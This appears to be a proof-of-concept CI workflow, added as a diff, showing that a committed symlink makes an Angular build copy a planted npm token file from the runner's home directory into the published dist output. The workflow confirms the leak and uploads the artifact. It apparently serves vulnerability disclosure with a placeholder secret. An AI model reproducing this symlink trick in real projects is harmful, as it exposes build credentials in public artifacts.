@@ -1,0 +1,36 @@
+name: ci
+on:
+  push:
+    branches: [main]
+permissions: {}
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Symlink survived clone
+        run: test -L public && readlink public
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          cache: npm
+      - name: Materialize build credentials as files (models self-hosted / ambient-credential runners)
+        run: |
+          mkdir -p "$HOME/.poc-creds"
+          printf '//registry.npmjs.org/:_authToken=SUPER-SECRET-NPM-TOKEN-DEMO\n' > "$HOME/.poc-creds/.npmrc"
+      - run: npm ci
+      - name: ng build
+        run: node node_modules/@angular/cli/bin/ng.js build
+      - name: Assert credential leaked into dist
+        run: |
+          if grep -R "SUPER-SECRET-NPM-TOKEN-DEMO" dist/ >/dev/null 2>&1; then
+            echo "TOKEN LEAKED INTO DIST:"
+            grep -Rl "SUPER-SECRET-NPM-TOKEN-DEMO" dist/
+            echo "**POC-CONFIRMED: credential present in build artifacts**" >> "$GITHUB_STEP_SUMMARY"
+          else
+            echo "token not found in dist"; exit 1
+          fi
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dist-with-leak
+          path: dist/
